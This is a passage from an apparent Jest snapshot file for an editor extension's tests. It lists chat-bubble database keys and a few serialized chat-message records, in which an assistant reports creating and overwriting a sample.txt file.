    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:71cfc086-7801-47e9-b7f9-d41eeec99e7c",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:72359e21-fcd5-4393-90bb-c4f218cc2cb2",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:72b1a628-2617-48bd-8f40-979f37cb8e70",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:7930de2a-bb46-4f9a-b882-c37ead417da3",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:7ab97181-580c-4bed-928f-8190f44ce908",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:7b53733c-c970-4582-a79f-0247a313dc9e",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:7eec589b-e0ae-4ee2-9eec-aeebf9e0bb08",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:819eb0b8-9859-42ba-a4bc-b1653d036a2b",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:81ca1f63-70bd-4784-bb96-4737f2f74eee",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:874108be-c324-4db5-bea8-c006882d4a9f",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:8ca9f836-bd48-4ffb-aee7-0b6b573cf1d0",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:8d0c07ec-9934-44ff-8996-eb4c00bf86b6",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:8f13703a-2404-489f-ad27-c9905b3302f3",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:8f86860c-90b5-445f-a3b5-fe6193e2099f",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:8fceee72-c5bc-4726-82f5-73161cdc1dce",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:901a83b8-cad1-456d-a0ee-5044cf6c8aaa",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:90f81932-0006-47b2-a4ea-54efa804337b",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:91726319-35ff-4ce0-a892-40ce8335a4d5",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:957b2072-9ec0-4d49-8317-b616b2cdf54e",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:99cb16d2-dc8f-4fc3-a1d4-e7ec76eafaa5",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:99db702c-3b9f-4c60-ba54-cd6116b88e90",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:9a22ff71-5228-41ec-aee3-c74f59836323",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:9d173359-420f-4233-ade5-2fd4f508d9b1",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:9e6f44f2-4782-4373-9887-bb890a26214e",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:9ee2f72e-88c1-4c65-89d7-0f2b87a024d6",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:a2915804-4bfa-42ec-8984-5d0a8f295a0f",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:a6a61e41-6502-4d50-ba64-685d93a69fd7",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:a81b23f3-34eb-47ff-b05e-040610657612",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:a854dff0-4fc5-4bcc-8bfa-9cbe30aa9d82",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:a8671dbe-8f02-428a-944f-35d85ea032f1",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:aec14c07-95b1-4f2a-bb8e-733459f9abfd",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:aeebacb3-fb84-4ef0-aa86-5c62c85023bf",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:b18b4178-3138-4409-ad92-0bcf21dd58d1",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:b28e504e-5060-4a09-83d2-c85c721f18da",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:b3dc23bf-da3f-45f4-a01d-ac170a73f955",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:b85ce68a-237e-4950-96ae-a9afd2a8a1ec",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:b9b13772-3e18-443f-9405-0a381a3bf75d",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:bbbe25bd-d09e-41f2-a5f3-ee8dab9da51c",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:bd8fa862-6a62-4056-b5be-18cca5685504",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:bf4d1d0e-485e-47c4-ad13-e0c4d1151108",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:bf6b0eea-d94d-4c87-acc7-a898f080cc4c",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:bf7fd2dc-c0da-4986-bfe8-74194fcd858e",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:c318e799-a2c1-4cbd-9f0f-a3fe578ce21e",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:c3437e32-65de-4fad-96a0-b7a2e8633fa3",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:c3d767bd-0285-42db-a245-8d057b30af0a",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:c5cbd89d-179e-406a-8480-017e918533f6",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:c5f6df58-a472-40ef-bac4-82729c20dfb8",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:c9bf28ce-1f9a-4e5c-ab2f-64107c1a2e9d",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:cb92d66b-d669-4366-ad7d-615fd245835c",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:cc32124b-c61c-400a-82ec-df1b5278342e",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:ce855cba-af71-4483-8ec6-82fddd504005",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:d2a7f755-0aca-4e15-b9c3-0e852ded490d",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:d3d18c05-f50a-4e38-8d05-5ac1726ae449",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:d421068d-b5b6-4f79-a576-ce584a2a2511",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:d666fd73-5722-4236-b901-18919ccd8b0e",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:d668df1f-e868-4528-ac19-0aaa09f4252c",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:dcac64d6-e7fe-4015-841e-2d52eeae587f",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:df999b54-c363-4d0c-ba0c-17d97ee8e8bc",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:e0ed03a1-7513-431a-8363-49f6733c309b",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:e210e8c1-8635-4177-8901-b19da83840df",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:e25389b5-26a7-4d11-9a63-849c1b9792d1",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:e51be9b8-1432-4782-9e34-e0f7b4fd60c0",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:e521ad96-a3cf-4fe1-b87c-64e5afa5d9fc",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:e907c411-21c1-4838-a886-daf251f32dcf",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:ee6c9eed-17c1-4b16-b392-45a48f5cc8d9",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:ee989ccc-8af5-4d98-acef-8c0239b8dd16",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:ef5464b8-5aa8-4898-8ccb-ade9f57afbee",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:eff6d6dc-32d7-44df-924b-dbbd75ded762",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:f1c8cb8a-bad0-402b-ab2a-951c4f67c5cd",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:f24ff6c3-6599-4f14-9aad-f500fbc76b42",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:f3afadea-aa2f-4b24-8e5d-55fdd43953f5",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:f4b3a653-58f6-4d63-9c48-c99e61ab6215",
  },
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:f80299f1-a1a5-46c7-8b4c-dc50bfc68027",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:0141c82d-b896-4082-8592-74f3f68e32dc",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:0399166d-0ad5-4ea3-bc5a-f863860379f0",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:0ee7a232-d853-4b2b-8e2b-8de833c9bb31",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:14b23def-4b31-41a5-8c36-374f309f6577",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:1b9e4953-3174-44ef-9121-d3a85cb737ad",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:2ef2a13e-6de1-4cb8-aecf-5053e4adb663",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:3875bcfc-8f70-4ece-875e-7c2613522601",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:41fbec23-bc66-42c6-9d20-6fc9742007e0",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:471afc61-ee25-4b4e-af70-87cce256b1f8",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:7a036cb7-10ab-468c-8498-709cb1157c30",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:b0330022-b1de-42fd-9d20-7c3f7280778b",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:bc6e299a-8dbf-4aa7-9088-490e2f109725",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:c38aa827-7db6-4749-80c3-5eae76dfc09d",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:d119b2c6-6119-4c09-98fb-2154f6fb3c46",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:d4b9031c-e49a-434d-8324-27fad5a22d5a",
  },
  {
    "key": "bubbleId:b868d67a-6b10-4004-bbbd-6c5a7533edf3:fa9efb3d-f986-48d8-b1b4-97218a4c3a66",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:013e556a-458c-43b2-9c8d-dfddbf4c9a60",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:0ade421c-2b3a-4f59-9c0b-fab1860acbf9",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:1857a00a-c193-4148-b2cd-92e8998e994e",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:216301e8-24b6-4245-a595-455607e73b2d",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:245bb644-6e36-43cf-a544-fac31713d9dd",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:2786a0a3-d698-4e27-8fef-5324b426eb89",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:2865557f-52dc-475b-ac19-f18e58db1065",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:3d1229fb-5b8b-44ba-8680-d50ac873966a",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:42b57a01-2747-4dd9-bdfb-398234f5e281",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:4de3e350-14f8-43c2-88f5-9254ac1f65fa",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:4eadb75b-f022-4fff-98a6-f733f68c49ac",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:4f2683c4-ef87-4baa-b06f-7938a262a31b",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:50498239-97cd-424c-8225-0fbd0e9e5355",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:70b570b4-589e-4b0a-8f9d-6f46dfbea185",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:75536356-db22-4a43-840b-ce5542ac6321",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:76e28f40-8943-465a-a568-b02a58f3887a",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:7f47f80e-38e2-41c8-93a5-ab511a6ffc5b",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:830fd836-8358-48b4-86e4-e0f3ddaa43d6",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:8420e862-6e65-4634-8464-8b080d723f7f",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:84d37c16-0f05-45f6-9831-7cb62939c416",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:85b03840-dbc4-4258-b1ef-0059f60e11f6",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:97a97b62-7f6d-46ea-aa43-6d7f4320a438",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:97c575c7-aee4-42ac-a5de-2ac1007df70e",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:9deaa1a0-cd91-41f3-8f2b-9ec45d843526",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:b8616c49-853b-4c56-95ca-69da1f6667c9",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:b86b802d-23d0-4954-9573-50fa9bf4cc5d",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:bd53d827-9bca-446d-9cda-84e3efc21571",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:bf7feb6f-ca1e-4808-a497-2b211ca23da1",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:c20a8c19-abe2-46ed-be1b-2ed8fe5d6fe3",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:c367a575-8e84-425a-bde5-4cb2a9b5470f",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:c91a8e68-5199-4238-8e33-684259d32149",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:e26f3e52-8fec-4dd7-a27b-1bce8ddf5f90",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:e3037f89-85c2-4e3c-9dbc-0e8c9e348b70",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:ec82aae1-e36b-4789-b7e5-eb9870192a91",
  },
  {
    "key": "bubbleId:dd443bda-e08c-4aa1-a90b-309ea2b0c945:f3eed24d-608f-4afe-a9fd-d3f4982131e4",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:037900c9-bedb-4104-bb21-b99b71918192",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:154e6f83-9ec3-420f-843a-94b65364c326",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:2d247a1b-6110-43c1-87e8-64fd20d79dbe",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:4ac48493-179d-4741-8af0-2d6b9e2d2098",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:4af61050-fa59-479e-b8c6-2661533cc6d3",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:4e88d203-b521-4ecd-b38e-99e528c6978b",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:520b783b-f85e-427b-a76d-49a85bbdc1c8",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:59e9c84a-42d4-4eea-a054-2869bf060e9b",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:5f63465b-b450-4b7a-80b1-d86bb9867e6c",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:64a5f589-bb5a-4a24-b279-4403869efa29",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:6ec5511d-ab34-49bf-9c08-40d84f561a3d",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:6ee22554-ebb7-474b-95f2-f702a48b7c23",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:7c130672-ac38-4a43-8a4d-c5aab5965a8d",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:882c70c8-991f-433f-9bae-9c04ea8a7899",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:8d61d0bb-38b3-451d-b2cf-e4ea90cb8dff",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:90ca9f7f-ddc0-4860-b227-35b48e745a9a",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:9b68a29e-9868-41c5-a8cb-97ab659cd0af",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:9dd23331-7a66-473a-a69a-2fde985f9c94",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:af64a95d-f0b5-4081-b63f-283dd46a33c5",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:b9dbffaa-5a39-48ca-a3dc-541c776d45a5",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:bbd503e9-407b-4bae-94f6-6ef5b549afdb",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:c644e3ce-f651-45dc-ad85-635f26b5c7f6",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:cf2efc07-6eae-4c51-9f4c-62d6084dccf0",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:d01daf5a-a3b9-436d-87c4-1310d883befe",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:d53c12cd-21be-4bfc-88ab-1edd23e910e9",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:d5bb8b51-f96f-4fa8-865c-d4569924e266",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:da66ce40-de69-4c86-b110-2691ae22db1e",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:daf789d9-f71f-4970-bbc8-269af8f67fbc",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:e24107da-c078-4056-b237-b3d81688129e",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:eedc7fef-dc05-4824-9122-dd8f56ff22ef",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:f7ce47e8-4ef5-4e73-9634-ed48516e3a9e",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:f8fe688a-3c22-408e-b699-2bbb946633e9",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:fca2cfb2-a9c1-4c73-abff-0573851f99a4",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:fceb8440-441b-4700-afd4-4d7d267284f2",
  },
  {
    "key": "bubbleId:fa82fd3a-6c2c-4300-aba9-92a25ad0afeb:fdd4dd50-c042-4fd5-bc93-5bc779f9786c",
  },
  {
    "key": "bubbleId:fad3fba8-79b6-47f0-8dd1-3d0f63b93894:1ff873e6-9a94-425d-9c0e-4da7fefa9125",
  },
  {
    "key": "bubbleId:fad3fba8-79b6-47f0-8dd1-3d0f63b93894:53689108-0850-4276-8850-6318e9e77cf5",
  },
  {
    "key": "bubbleId:fad3fba8-79b6-47f0-8dd1-3d0f63b93894:5d86d361-94a4-4bf5-a434-f49944de5e01",
  },
  {
    "key": "bubbleId:fad3fba8-79b6-47f0-8dd1-3d0f63b93894:76374f35-18d7-43dc-8885-14ecfe3b08d3",
  },
  {
    "key": "bubbleId:fad3fba8-79b6-47f0-8dd1-3d0f63b93894:8c99ec18-c2ce-4d2a-b202-077197c8c688",
  },
  {
    "key": "bubbleId:fad3fba8-79b6-47f0-8dd1-3d0f63b93894:8e03beb6-b73e-4f01-8a06-718e8f97c94c",
  },
  {
    "key": "bubbleId:fad3fba8-79b6-47f0-8dd1-3d0f63b93894:9675c9bc-9f1f-470a-ac77-80770a3125a2",
  },
  {
    "key": "bubbleId:fad3fba8-79b6-47f0-8dd1-3d0f63b93894:aa6dde5d-42f1-45f6-8771-3fadafcbbc1c",
  },
  {
    "key": "bubbleId:fad3fba8-79b6-47f0-8dd1-3d0f63b93894:b8525aa6-25a8-43a7-b95c-1233d74c65a3",
  },
  {
    "key": "bubbleId:fad3fba8-79b6-47f0-8dd1-3d0f63b93894:ebceae0f-7d95-488e-ae81-51ac815330f3",
  },
  {
    "key": "bubbleId:fad3fba8-79b6-47f0-8dd1-3d0f63b93894:faa831d8-b66b-4f1d-a665-e8aa97c1a2fb",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-2 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:54803258-5483-485b-895f-4b0b703781c8",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"54803258-5483-485b-895f-4b0b703781c8","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:13.110Z","isQuickSearchQuery":false,"text":"Creating a sample file in the repo root:\\n","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-3 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:5f4c8d99-2985-41df-8607-8ee28cfb890c",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"5f4c8d99-2985-41df-8607-8ee28cfb890c","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":10477,"outputTokens":559},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T10:58:18.967Z","isQuickSearchQuery":false,"text":"Created \`sample.txt\` in the repo root. Since \`sample.txt\` already exists, it was overwritten. Want a different name or content?","usageUuid":"701535c0-1c34-44e5-8d68-af1b2caa300b"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-4 1`] = `
[
  {
    "key": "bubbleId:5ab4c616-183d-498c-a65c-7a2935a9f46c:7e9c54fb-9efb-4a5c-9aeb-d1cf08b84a28",
